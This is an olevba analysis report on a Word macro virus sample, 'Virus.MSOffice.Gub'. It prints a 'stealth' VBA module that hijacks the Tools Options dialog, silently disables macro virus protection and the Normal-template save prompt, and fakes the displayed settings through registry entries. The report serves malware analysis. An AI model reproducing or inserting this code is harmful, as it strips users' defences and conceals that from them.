olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Gub-e1ed7328201ff0d36548dad6b0d973737e084b55
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Gub-e1ed7328201ff0d36548dad6b0d973737e084b55 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO stealth.bas 
in file: Virus.MSOffice.Gub-e1ed7328201ff0d36548dad6b0d973737e084b55 - OLE stream: 'Macros/VBA/stealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsOptions()
'by VOVAN//SMF
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") Then GoTo 1
If Options.VirusProtection = 1 Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "No"
If Options.SaveNormalPrompt = 1 Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "No"
1: If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Then Options.VirusProtection = 1 Else Options.VirusProtection = 0
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Then Options.SaveNormalPrompt = 1 Else Options.SaveNormalPrompt = 0
If Dialogs(wdDialogToolsOptions).Show >= 0 Then
Exit Sub
End If
If Options.VirusProtection = True Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "No"
If Options.SaveNormalPrompt = True Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "No"
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

